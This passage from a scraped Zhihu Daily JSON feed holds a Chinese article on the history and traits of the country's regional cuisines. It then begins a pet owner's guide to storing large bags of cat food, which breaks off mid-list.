年，至于各菜系本身的口味、烹饪手法区别，也只是在近几百年来才出现的。比如中餐中常见的炒菜，要等到宋代才开始普及，流行于各地的辣味菜肴，也要等到美洲辣椒传入并广泛种植后才能普及。</p>\n<p><strong>“菜系”的出现</strong></p>\n<p>菜系一词的前身，是清末民国时所说的“帮口”。当时，由于餐饮业的发展，加之各地菜式、口味的区别，人们借鉴帮口的概念，以本帮菜、杭帮菜、盐帮菜、苏帮菜等称呼，区分不同的饮食流派。新中国成立后，为了消除帮口称呼中的封建色彩，将其改称为菜系。据说菜系一词，是来自五六十年代分管财贸活动的姚依林同志。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-15c4dceec3faef2dda7c12683641f4b5_720w.jpg?source=8673f162\" alt=\"\"><figcaption>90 年代初的菜系分类，陈光新，《菜系的认定》，《四川烹饪》1992 年第 1 期</figcaption></figure><p><strong>1980 年 6 月 20 日，《人民日报》第四版“小常识”栏目刊登了由汪绍铨撰写的《我国的八大菜系》，这可能是文献中关于八大菜系的最早记录。</strong>不过当时，菜系一词才刚开始流行，所以四大菜系、五大菜系、八大菜系、十大菜系等等说法并存。甚至八大菜系本身包含哪些菜系，都没有形成定论。至于哪个菜系排第一，更是无从考证，大抵只是人们的口水仗罢了。</p>\n<p>*.类似的还有某某方言差点成为普通话之类的流言。</p>\n<p><strong>为何八大菜系大多都在中国南方？</strong></p>\n<p>目前比较公认的八大菜系，只有鲁菜是纯粹的北方菜系，其余菜系中，淮扬菜诞生于长江以北，介于南北之间，大多数菜系，确实都在中国南方，这是为什么呢？</p>\n<p>口味的形成，和族群、方言、文化的形成过程类似。古时交通不便，人口流动比较少见，受气候、地理、物产、历史、宗教和技术发展的影响，各地逐渐发展出了不同的烹饪传统，按现在常见的说法，就可以称之为菜系。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-301561b0086d8f9f9d687d5148a1f326_720w.jpg?source=8673f162\" alt=\"\"><figcaption>鲁菜善用爆、烧、炸、炒，口味偏重，图为鲁菜之九转大肠</figcaption></figure><p>举例来说，中国西南地区气候温暖潮湿，远离海洋，盐比较昂贵，因此当辣椒传入中国后，很快就爱上了吃辣。辛辣的辣椒可以排解湿气，也可增加风味，弥补食盐不足导致的味觉缺乏。而东北地区相对寒冷，冬季漫长，缺少绿叶蔬菜，为了保存食物，人们就发展出腌渍、烟熏、风干等加工方式。一些地区地理位置优越，商贸发达，经济富足，在文化融合和各地物产的滋养下，就有了格外丰富的烹饪传统。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-61b1263d10f56720ea0d333eca6aa872_720w.jpg?source=8673f162\" alt=\"\"><figcaption>粤菜食材丰富，注重食物本味和新鲜，一般比较清淡，图为粤菜之烧腊拼盘</figcaption></figure><p>技术和历史发展同样是影响菜系形成的重要因素。比如中国古人率先发展出制造铸铁的技术，大大提高了铁产量，随着铁锅、菜刀等铁器的大规模普及，炒菜和刀工的发展就成为可能。唐代之后，随着印度蔗糖生产技术的传来，甜味逐渐成为饮食中不可或缺的一种口味。这些都深刻影响着菜系和口味的变迁。</p>\n<p><strong>至于为何八大菜系中来自南方的菜系更多，这可能和中国的地理、气候、人口分布、经济发展有关。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0e71a0270fa01e40d090548e74860266_720w.jpg?source=8673f162\" alt=\"\"><figcaption>汉语的方言分布</figcaption></figure><p>前面说过，菜系的形成，和族群、语言、文化的形成过程类似，有趣的是，中国的方言和族群分布同样也遵循着南多北少的格局。从上面这张汉语方言分布图中可以看到，北方除了山西的晋语之外，均属于北方官话区，南方的江淮官话和西南官话虽然属于广义的官话区，但区别较大，其余就属于相互之间不能互通的各种方言了。这些方言差不多也能和大的菜系对应起来。（比如粤菜对应粤语区，淮扬菜对应江淮官话区）</p>\n<p>为什么会形成这样的格局呢？个人认为，可能主要和地理因素相关。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-57f445b1ecdbad11e05d6ea76ac41691_720w.jpg?source=8673f162\" alt=\"\"></figure><p>中国北方的华北平原，在唐代中晚期之前，一直都是中国人口密度最高的地区。华北平原面积较大，土地平坦，便于各地人群的互相交流，因此无论在方言，还是饮食上，都呈现出比较相似的特征。华北在唐宋之前主要种植粟、黍等杂粮，之后则以小麦为主食，主要以面食为主。相对南方，华北没有那么多山珍野味，蔬菜水果种类相对较少，食材的选择相对有限，在饮食发展上，就不如南方那么得天独厚。</p>\n<p>而在华北，沿海的山东既有平原，也有山地，又临大海，自古就以物产丰富著称，可能是华北烹饪食材选择最丰富的地区。元代以后，大运河从山东穿过，沟通了南北方，坐享丰盛的物产和优越的交通区位，鲁菜因此得以发展兴盛，成为北方菜的代表。北方的陕西和河南原为京畿所在之地，也有悠久的饮食文化，但随着经济中心的转移，宋代之后影响力日渐减少，其它北方菜，在影响力或者全面性上也不如鲁菜，因此就未能入选八大菜系。</p>\n<p>唐宋之交，中国的经济和人口分布中心转向南方。和华北相比，南方山脉纵横、水系密布，天然形成了相互隔离的区块，彼此之间难以相互交通，就形成了复杂的族群、方言和饮食分布格局。</p>\n<p>南方主要以稻米为主食，生物多样性比较丰富。能够选择各种各样的在烹饪食材，有利于不同饮食风格的形成。南宋之后，大城市主要集中于南方以及长江沿岸，经济发展以及市民文化的崛起，进一步推动了餐饮业的发展。以四大菜系为例，其中的淮扬菜，象征着明清江淮盐商的富足，川菜所在的四川，自古就以天府之国闻名，而粤菜所在的广东，则是近代对外开放的先锋。</p>\n<p>总之，菜系的形成，是与物产和经济发展密不可分的。</p>\n<p><strong>中国菜系巡礼</strong></p>\n<p><a href=\"https://www.zhihu.com/question/359455045/answer/1990710463\">中国为什么会形成如此丰富的「菜系」，国外也有著名的地区菜系吗？</a></p>\n<p>之前在其他回答中介绍了世界各地的地区菜系，那么中国各地又有哪些菜系呢？</p>\n<p>尝试进行全面的总结——</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-23b6448636ca5661cdaf8a38cc03a5df_720w.jpg?source=8673f162\" alt=\"\"><figcaption>鲁菜之葱烧海参</figcaption></figure><p><strong>鲁菜</strong>：可分为内陆的济南菜和沿海的胶东菜两大派系，也可加上官府菜中的孔府菜。济南菜擅长爆、烧、炸、炒，口味偏重，咸鲜为主；胶东菜擅长烹饪海鲜，口味相对清淡，更注重本味；源于曲阜孔府的孔府菜则以精细考究著称，菜名别具一格。作为北方菜的代表，鲁菜对华北的烹饪影响深远，明清两代的宫廷厨师大多即来自山东。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c5926bb11cd37fde077150f93288d1c3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>粤菜点心</figcaption></figure><p><strong>粤菜</strong>：狭义指以广州为中心的广府菜，广义上包含潮汕菜、客家菜。广府菜注重发挥食物的本味，香料用量不多但取材广泛，口味相对清淡、很少吃辣，多以清蒸等方式烹饪。客家菜口味相对偏重，油水足，潮汕菜则擅长烹制河鲜。广东人以什么都吃闻名，食材取样丰富，近代以来，得益于发达的工商业和贸易，烹饪行业迅速发展，目前获得米其林 3 星的中餐厅大多为粤菜。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3ff318f7bb1d3fd960a7b4b7710d1699_720w.jpg?source=8673f162\" alt=\"\"><figcaption>淮扬菜之文思豆腐</figcaption></figure><p><strong>淮扬菜\\苏菜</strong>：明清时代，大运河与长江交汇的淮安、扬州一带繁华一时，融合南北菜系，在这里形成了淮扬菜。淮扬菜注重刀工，强调本味，注重调汤，口味相对清淡，是国宴的主要菜系，也是明清文人钟情的菜系。另有以苏菜替换淮扬菜的。苏菜还包括来自南京的金陵菜；口味偏甜的苏锡菜以及受鲁菜影响，口味相对较重的徐海菜这几个派系。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-eedfb45b6b1474b15a2bb08c0726917a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>川菜之麻辣火锅</figcaption></figure><p><strong>川菜</strong>：明末清初，辣椒传入中国，原本就有丰富饮食文化的四川，逐渐形成口味麻、辣、鲜、香，味型复合多样的川菜，其小炒、干煸和干烧手法独具特色，也许是如今国内外最流行的中餐菜系。川菜又可分为以成都为中心，口味温和，讲求用料的上河帮川菜；以重庆为中心，做法大胆粗犷的下河帮川菜（江湖菜）以及以自贡为中心，口味浓重麻辣的小河帮川菜（盐帮菜）。</p>\n<p>--------------------- 以上，是公认的四大菜系 ----------------------</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-75ec9a3ed68960bffa328609013ccabe_720w.jpg?source=8673f162\" alt=\"\"><figcaption>浙菜之龙井虾仁</figcaption></figure><p><strong>浙菜</strong>：浙江有山有水，既厂河虾海鲜，也有山珍野味，形成了注重本味，口味清鲜脆嫩的浙菜。其中，兴盛于杭州的杭帮菜口味清鲜淡雅；浙东沿海的宁波菜口味咸鲜；浙东内陆的绍兴菜口味汁浓味重，浙南沿海的温州菜则注重清鲜。另外，绍兴、宁波一带还以吃“臭”闻名。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-56267d49ae69643fa95f06902d465009_720w.jpg?source=8673f162\" alt=\"\"><figcaption>闽菜之佛跳墙</figcaption></figure><p><strong>闽菜</strong>：福建地形、物产与浙江相似，但较为偏南，海洋色彩更加浓重。闽菜使用虾油、虾酱等特色调味料，突出“糟”味，注重清鲜酸甜，擅长制作汤菜。狭义闽菜指福州菜，口味偏酸甜，善用红糖调味；闽南菜讲究佐料，爱用蘸酱，对潮汕、台湾、东南亚饮食影响深远；闽西菜即客家菜。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-1f6a44ea88137e445a4c76bf3734f2a0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>徽州菜之虎皮毛豆腐</figcaption></figure><p><strong>徽菜</strong>：狭义徽菜即徽州菜，发源于古代的徽州府。徽州府位于黄山一带，植物和野味种类丰富，气候温暖潮湿，形成了重油、重色、重火功的徽州菜，以红烧、滑烧、清炖、生熏手法见长，明清时代，随着徽商的兴盛而颇具影响。广义徽菜则包括整个安徽，有皖南菜、皖江菜、合肥菜、淮南菜、皖北菜等菜系，大多表现出南北融合的特点。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-fa78f48dc12b8f395ff9b6e563d261e3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>湘菜之剁椒鱼头</figcaption></figure><p><strong>湘菜</strong>：湖南气候温和湿润，明清时代，随着辣椒的传入，形成了口味香辣，注重入味，口味丰富的湘菜。过去湖南菜中辣味菜肴并不多，但对苦味的嗜好却从先秦流传至今，可以称得上是传统了。湘菜又可分为以官府菜组庵菜闻名的湘江菜；以腊味知名的湘西菜以及以河鲜闻名的洞庭菜。</p>\n<p>--------------------- 以上，是公认的八大菜系 ----------------------</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c62deb4d7187cdf3a4f6850dcea1a483_720w.jpg?source=8673f162\" alt=\"\"><figcaption>京菜之京酱肉丝</figcaption></figure><p><strong>京菜</strong>：古代北京一带的口味与山东近似，许多厨师又来自山东，因此形成了以鲁菜为基础的京菜（又称京帮菜）。贵为数百年来的京城，北京交通频繁，受到各种文化和饮食习惯的影响，因此今日的京菜，又融合了宫廷菜、清真菜等风味。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b73a7963e0ec0aea560b89d06b7b1306_720w.jpg?source=8673f162\" alt=\"\"><figcaption>本帮菜之草头圈子</figcaption></figure><p><strong>沪菜</strong>：上海地处江南，传统口味与苏南相似。清代末年，在苏南和本地口味基础上，形成了浓油赤酱，口味偏甜，带有平民特色的本帮菜。近代上海华洋杂处，是远东的经贸、交通中心之一，广东、安徽、江南、江淮乃至国外的厨师相继来沪开设菜馆，在此基础上形成的充满融合和改良特色的饮食风格，则可视为广义的沪菜。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-847bc06eb4cd08e3ecb6f47282977469_720w.jpg?source=8673f162\" alt=\"\"><figcaption>楚菜之沔阳三蒸</figcaption></figure><p><strong>楚菜</strong>：长江中游的江汉平原水产丰富，是著名的鱼米之乡。以此为中心，形成了汁浓芡亮，香鲜微辣，擅长清蒸的楚菜（又称鄂菜、荆菜）。楚菜又可分为擅长烹制水产，以蒸菜见长的汉沔风味；口味偏重，擅长烹制禽肉的襄郧风味；以东坡菜文明的黄冈风味；突出咸鲜辣味，长于烹制野味山珍的的鄂咸黄风味；强调咸鲜酸甜味，以加工水产见长的荆宜风味以及擅长腌制，口味酸辣厚重的土家族苗族风味。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1dea3aba51baaf4b902447df45993ce3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>赣菜之粉蒸肉</figcaption></figure><p><strong>赣菜</strong>：长江以南的江西气候暖湿，河湖纵横。在辣椒传来之后，形成了味浓油重，口味香辣咸鲜，带有乡土风味的赣菜。据说江西是全国吃得最辣的省份，按照地域，又可把赣菜分为南昌菜、浔阳菜、饶帮菜、赣州菜、萍乡菜等流派。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9686bcfe5914afb9b970153b0691b8d0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>滇菜之过桥米线</figcaption></figure><p><strong>滇菜</strong>：云南地处西南的云贵高原，气候立体多样，动植物种类丰富，族群文化充满多元性，因此云南的滇菜也是民族特色最浓厚的菜系之一。总体来说，云南菜以烹饪山珍见长，常以菌类和鲜花入菜，口味偏辣。按照地域，可分为口味与川菜接近的滇中和滇东北菜；具有高原特色，肉奶丰富的滇西北菜；兼食米面，擅于制作腌菜和乳制品，带有白族风情的滇西菜以及口味酸辣，富有热带风情的滇西南傣族菜。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-a7bc8a08fbfe50aafe6b6d85ce8f166c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>黔菜之丝娃娃</figcaption></figure><p><strong>黔菜</strong>：贵州地形崎岖，气候湿润，民族众多。久而久之，就形成了调料独特，强调酸辣香浓的贵州菜。贵州人注重酸，每个族群都有自己独特的酸汤，又有木姜花、薄荷香、折耳根等独特的调料，以及搭配食物的各式蘸水，口味丰富。根据其形成过程，贵州菜又可分为特点多元的民族才，做工精致的土司菜，以及寻常可见的民间菜。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-366af2d0a914021aa6a9241adecd1655_720w.jpg?source=8673f162\" alt=\"\"><figcaption>豫菜之牡丹燕菜</figcaption></figure><p><strong>豫菜</strong>：河南地处中原，自古以来就是中国的粮仓之一。在古代，河南长期是中央王朝的统治中心所在，人口繁多，交通频繁，在古代宫廷菜、市肆菜和民间菜的基础上，逐渐发展出口味中和的豫菜。豫菜特色是中扒（扒菜）、西水（洛阳水席）、南锅（锅鸡、锅鱼）、北面（面食、馅饭），以扒、烧、炸、熘、爆、炒、炝等烹饪手法为主。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9a082fd709df68299264ba10a28c608d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>秦菜之腊汁肉夹馍</figcaption></figure><p><strong>秦菜</strong>：陕西西安是汉代丝绸之路的起点，也是许多王朝的古都。从汉中、关中到陕北，陕西地形气候多样，历史上又有官府菜、商贾菜、市肆菜、民间菜以及清真菜等不同的烹饪传统，逐渐形成以以烧、蒸、煨、炒、氽、炝等烹饪手法为主，擅长烹制牛羊肉，主味突出，强调香味的秦菜。广义上的秦菜，也包括甘肃、宁夏、青海等西北风味。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-a580a82ea44a5681f28f2d8bef0fc73b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>晋菜之莜面鱼鱼</figcaption></figure><p><strong>晋菜</strong>：山西山脉纵横，气候差异大，素有表里河山之称，历来是中原政权对抗外敌的前线。在地理和历史的推动下，山西逐渐形成了太原帮、晋南帮、雁北帮、晋东南帮、五台山斋派及清真菜等菜系。总体来说，山西人爱吃醋，基本口味以咸香为主，酸甜为辅，烹饪选材朴实，注重火功，面点和面食的种类尤为丰富多样。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-dccccc2c3b065f4f6bc3348eb43ec16a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>东北菜之锅包肉</figcaption></figure><p><strong>东北菜</strong>：东北地域辽阔，气候寒冷却物产多样。历史上，东北杂居着各种游牧、渔猎、农耕族群，生活习惯各异。近代以来，大批汉族移民闯关东来到东北，将自己的饮食文化与东北的传统和自然条件结合起来，形成颇具影响力的东北菜。在寒冷其后的影响下，东北形成了独特的腌制蔬菜和冷冻食品的习俗。总体来说，东北菜量大、朴实、口味咸鲜醇厚，比较大众化。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-6fa254f59328782ee17d023ccf1bb830_720w.jpg?source=8673f162\" alt=\"\"><figcaption>客家菜之客家酿豆腐</figcaption></figure><p><strong>客家菜</strong>：客家人大多生活在福建、江西、广东等地的山区丘陵地带，很多省份的地方菜系中，都能见到客家菜的影响。传说客家人的祖先来自中原，来到南方后，受气候和当地畲族等族群影响，发展出口味肥、咸、熟的客家菜。由于主要居住在内陆，客家菜主要以山间野味为食材，海鲜较少，喜欢吃鸡、鸭、猪肉等肉类，擅长煮、炖、熬、酿、焖等烹饪技法。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-949efa6f76a637c06c5d6a670f740bac_720w.jpg?source=8673f162\" alt=\"\"><figcaption>香港菜之菠萝油</figcaption></figure><p><strong>香港菜</strong>：近代以来，香港从默默无名的渔村发展为东亚最繁荣的都市之一。各地的人们来到香港，带来了自己的饮食习惯，从中国大陆的各种菜系，到东南亚、南亚乃至欧美的菜式，不一而足。总体来说，香港菜以粤菜为基础，融合了国内外菜系的特色。作为一座快节奏的都市、香港的大排档、茶餐厅文化独树一帜，从这也诞生了许多商业气息浓厚，适合城市生活的食品。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-92eb0a6547572ab40e060b5da184158b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>台湾菜之珍珠奶茶 + 鸡排</figcaption></figure><p><strong>台湾菜</strong>：台湾气候温暖，盛产蔬菜、水果，原本居住着各种南岛语族群。明末以来，大陆的闽南、客家移民来到台湾，此后又受到西方殖民者统治。日本料理和西方菜系在日治时期引入台湾，随后国民党政府到来，带来了大陆的各式菜系。如今的台湾菜主要以闽南、潮汕风味为基础，受到粤菜、日本菜等影响。台湾小吃很出名，常以水果、酱菜入菜，注重节令食补，偏好酸甜口味。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5479889ecb81d7c74d0b23731407fad0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>清真菜 之它似蜜</figcaption></figure><p><strong>清真菜</strong>：清真菜即遵循伊斯兰教饮食禁忌的菜系。我国有不少主要以伊斯兰教为信仰的族群，分布在全国各地（大多在西部）。严格说来，清真菜不能算是一个菜系，因为这些信仰伊斯兰教的族群居住在全国各地，饮食风俗各异。不过概括起来，清真菜还是有些共同特征，比如肉类以牛羊肉为主，擅长制作一些带有中亚和中东风格的甜点，遵循伊斯兰饮食规范等。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-114c8b8fa7402c01fce1deb89c337dad_720w.jpg?source=8673f162\" alt=\"\"><figcaption>素食菜之素鸭</figcaption></figure><p><strong>素食菜</strong>：出于宗教、文化等各种原因，中国各地分布着不少素食者。和清真菜系类似，素食菜的地域特色相对比较淡，更富宗教色彩。中国的素食菜大多与佛教有关，为了代替肉类提供蛋白质，各种豆制品和菌菇在素食菜中扮演着重要的角色。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-b4bb3c98465159d434887b6915c4c5bf_720w.jpg?source=8673f162\" alt=\"\"><figcaption>官府菜之孔府菜</figcaption></figure><p><strong>官府菜</strong>：官府菜即出自官僚士大夫阶层的菜系，大致可以和国外的贵族饮食对应。官府菜选料考究，烹饪精细，在规格上低于宫廷菜，但远高于平民菜，具体口味则视主人和厨师各异。中国比较有名的官府菜有孔府菜、东坡菜、云林菜、随园菜、谭家菜、段家菜等。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-43b09dfe28972747d2034bce58eb3bc3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>仿膳之上菜</figcaption></figure><p><strong>仿膳</strong>：古代把提供给皇帝的饮食成为御膳。清代完结之后，宫廷御厨流落民间，一些厨师重操旧业，仿照原先的宫廷料理制作的菜，就被称为仿膳。继承了宫廷料理的风味和习惯，仿膳选料考究，烹饪精细，注重菜肴的寓意。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-0ec60d20fd892d43b53428667be11a1f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>蒙古菜之查干伊德（奶食）</figcaption></figure><p><strong>蒙古菜</strong>：蒙古高原生活着游牧为生的蒙古族。游牧民族逐水草而生，居处不定，肉类和乳制品在他们的日常饮食中扮演着重要角色。蒙古组的饮食比较粗犷，以肉、奶、野菜、面食为主要原料，注重食物的本位和分量的实在，烹饪方式比较简单，以烧烤、炖、蒸、涮为主。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-4b6fea2d7da101dc756a179f833203a8_720w.jpg?source=8673f162\" alt=\"\"><figcaption>新疆菜之羊肉抓饭</figcaption></figure><p><strong>新疆菜</strong>：新疆地域广阔，自然环境各异，生活着经营绿洲农业的维吾尔族，游牧的蒙古族、哈萨克族，高山上的塔吉克族，到各行各业汉族在内的各色族群。总体来说，新疆气候比较干旱，饮食大多接近中亚风格，以肉、蛋、奶、面食为主，善于制作干果，用烧烤、馕坑烤、爆、涮、酱、扒、蒸等方式进行烹制。当地汉人口味和西北的秦菜类似，但也受到四川等地饮食的影响。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7f27f23c3d557d9dcc1cd80ff45576ac_720w.jpg?source=8673f162\" alt=\"\"><figcaption>西藏菜之藏面配甜茶</figcaption></figure><p><strong>西藏菜</strong>：青藏高原是世界屋脊，海拔很高，氧气稀少。当地藏族等族群多以游牧、畜牧维生，也种土豆、青稞等作物。西藏菜烹饪一般比较简单，原料以肉、乳制品，米、面、青稞等谷物以及土豆、萝卜等蔬菜为主。喜欢油多味厚，香酥甜脆的食品，多用酸、辣以及各种香料调味。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-3e3255b391bbbaa4cf7f1160a55ce2f8_720w.jpg?source=8673f162\" alt=\"\"><figcaption>傣族菜之撒撇</figcaption></figure><p><strong>傣族菜</strong>：傣族生活在云南南部的热带、亚热带地区，与中南半岛的泰人、掸人等同源。傣族菜充满热带风情，口感酸辣、清淡、开胃，烹制时一般不勾芡。烹饪选材独特，包括各种珍贵菌类、菜薹乃至昆虫。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-775e59c82e67057e3e14865754c90b00_720w.jpg?source=8673f162\" alt=\"\"><figcaption>朝鲜族菜之冷面</figcaption></figure><p><strong>朝鲜族菜</strong>：朝鲜族主要生活在东北的吉林等地，以水稻为主食。中国朝鲜族的饮食与朝鲜半岛相似，食物加工较少，少油分。喜欢发酵食品和天然调味料，以辛辣的腌制食品（泡菜）、清炒、锅煮、煎烤、生吃食物为特征。多以麻油、酱油、大蒜扥调味。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-81a167d1a2aa36088b617cc09abc6b0c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>俄罗斯族也是中国的少数民族……</figcaption></figure><p><strong>其他族群和地域菜系</strong>：五十六个民族，34 个省级行政区，中国的族群、地域和口味的多样程度，并不是本文所能覆盖的，篇幅所限。就到此为止吧。</p>\n<p>*.其实我很想找类似上图这样的汇总图，不过，要找到高颜值的中国各大菜系菜肴汇总图，真的不容易，以下是目前找到的一些比较靠谱的汇总图——</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-0d21950ac39399e90fde22f6bdca52f8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>粤菜点心</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9987c1e336365e171667c5369942100e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>成都的某家川菜馆</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a96ac7ece681053a152dc37e311b95e5_720w.jpg?source=8673f162\" alt=\"\"></figure><p>旧金山的上海菜馆</p>\n<figure><img src=\"https://pica.zhimg.com/v2-84dd63a384455fba5159dd029f52c63e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>美国某家香港菜馆</p>\n<p><strong> </strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/20436909\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738362"},{"title":"大袋猫粮如何储存？","date":"2021-07-22 23:06:33","description":"<div>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-81f3b2e490759fadccd2ddbc999eaeaa_l.jpg?source=8673f162\"><span>八只包子，</span><span>有只猫，日系家居爱好者，猫叫伊吹你懂的，很高兴遇见你呀✨</span>\n<a href=\"https://www.zhihu.com/question/279414065/answer/1133106991\" hidden>阅读原文</a>\n</div>\n<div>\n<p>猫粮越大包性价比越高！可是...</p>\n<ul>\n<li>大包猫粮要怎么储存？</li>\n<li>怎么判断猫粮受潮变质？</li>\n<li>猫吃坏肚子得不偿失？</li>\n</ul>\n<p><strong>先说简单粗暴的结论，最直接看猫粮有没有受潮的方法，是直接放嘴里嚼看脆不脆。</strong></p>\n<p>包子翻了豆瓣，小红书大量铲屎官的经验，以及自身实际情况，按照储粮工具的成本从低到高，吐血整理了几个靠谱储存办法！</p>\n<p><strong>一、大夹子和干燥剂</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-370f4102a60c365591ec0159b0c32473_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-1be88f6f57ca1190a41b585a03823752_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图：自家已经吃完的 GO 猫粮，大袋子本身有密封条，这样保存了 5 个月没有坏。</figcaption></figure><p><strong>存啥：</strong>已开封的一整包猫粮。</p>\n<p><strong>优点：</strong>简单粗暴 0 成本，猫粮袋子本身设计的就是符合保存的标准的，直接把干燥剂丢进去，大夹子夹稳密封好就 ok。</p>\n<p><strong>缺点：</strong>仅限于南方地区非潮湿季节、非混粮喂养家庭暂时性保存。到后期我在猫粮袋附近看见了米虫，好在里面没有影响，所以这法子不适用于长期保存哦！</p>\n<p><strong> </strong><strong>二、发酵桶</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-e2a39d9ba335eea571ecefa9e5f4eabb_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-823faad47f7ab4e30dc11017e403198d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图：豆瓣网友把一整袋猫粮，连带着包装塞进了 25L 的酵素桶里</figcaption></figure><p><strong>存啥：</strong>已开封（未开封）的一整包猫粮</p>\n<p><strong>优势：</strong>食品级塑料，防潮性最佳。发酵要求的就是完全密封环境，所以酵素桶的密封性超好！而且猫粮直接整包塞进去，网友血泪教训是宁愿买大也别买小，买 20L 的 5kg 粮连包装塞进去拿出来都很困难~</p>\n<p><strong>劣势：</strong>取的时候有点麻烦，有点占地方，样子有点点点一言难尽，但我也准备入手了～</p>\n<p><strong>三、真空袋</strong></p>\n<figure><img src=\"https://pica.zhimg.com/v2-9e2d35d01188eab2bc86ef19593300da_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-23a26233282b4a835b8be0d548ef83c4_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图：小红书网友的拆包储粮方式</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-810a0e743d03683d567a7a170a42ad7a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图：我自己的爱肯拿猫粮，爱肯拿包装没有密封条，必须要想办法存放好。 </figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-1a5add9117191c2103f722583bb49da0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图：我自己的渴望猫粮，大包装也没有密封条，又整包塞进了真空袋子里，但我发现确实会漏气..</figcaption></figure><p><strong>存啥：</strong>已开封，没吃完的猫粮</p>\n<p><strong>优势：</strong>简单粗暴，密封性 ok，不占地方。我采用的是一整袋猫粮塞进去去，买的是平常装被子衣服的小号真空袋，再用吸尘机一抽就完事了。</p>\n<p><strong>劣势：</strong>运气不好会漏气，要挑质量好的！但我整包放进去，所以还能再继续抽真空补救，感觉比第一种办法安心。</p>\n<p><strong> </strong><strong>四、真空机</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d481c1a42bfe5773ded4d0dcfce25b15_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-21a0888efca04d74e9f54184a5ba1337_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图：小红书网友</figcaption></figure><p><strong>存啥：</strong>所有猫粮</p>\n<p><strong>优点：</strong>防潮性是最好的，看起来就很靠谱。真空防潮，分装好后开一袋吃一袋，真空袋什么尺寸都有，网上很多心灵手巧的小仙女都是这样保存哒。</p>\n<p><strong>缺点：</strong>太麻烦，不适用于懒癌，要反复购买真空袋分装，金钱和时间成本比较高。看下来...非常不适合我....</p>\n<p><strong> </strong><strong>But 不推荐：简单密封袋</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a23ed57e33bea6eb9e3c4427da80f58a_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>存啥：</strong>不买就没有保存对象</p>\n<p><strong>优点：</strong>每家每户都有，随手即取</p>\n<p><strong>缺点：</strong>分装过程中容易二次污染，加上不密封也不牢固，不小心一碰就开，小动物一啃就坏，真心不推荐嗷！</p>\n<p><strong> </strong><strong>五、储粮密封（米）桶</strong></p>\n<figure><img src=\"https://pica.zhimg.com/v2-4aa95d0b0615502ba92f30d525c11dc0_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img 